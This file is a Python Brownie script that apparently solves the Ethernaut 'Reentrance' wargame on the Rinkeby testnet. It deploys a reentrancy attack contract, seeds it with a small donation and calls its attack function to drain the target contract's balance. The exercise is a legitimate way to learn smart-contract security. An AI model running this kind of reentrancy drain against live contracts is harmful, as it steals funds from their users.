from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3, eth

import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xaB6E14A0f22B0812822E39DF2825C459c51B5064'
target_ct=interface.Reentrance(target_address)

# # # deploy target contract for dev
# target_ct=Reentrance.deploy({'from': attacker, 'priority_fee': priority_fee})
# target_address=target_ct.address
# # for dev too, we need an account sending ETH into the pool to simulate that there is already somtehing
# pool_funder=accounts[1]
# pool_funder.transfer(target_address, amount=1000000000000000, priority_fee=priority_fee)

# deploy attacker contract
attacker_contract=reentranceAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():
    print('attacker_contract:', attacker_contract.address)
    print('target_address:', target_ct.address)

    target_balance=target_ct.balance()
    print('target_balance:', target_balance)

    donation=target_balance/10

    # donate a small amount to have a non null balance
    tx=target_ct.donate(attacker_contract.address,{'from': attacker, 'priority_fee': priority_fee, 'amount': donation} )
    print('attacker balance after donation:', target_ct.balanceOf(attacker_contract.address))

    # call the attack() function 
    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000, 'allow_revert': True})

    print('tx_value:', tx.value)
    print('target_ct balance: ', target_ct.balance())

    
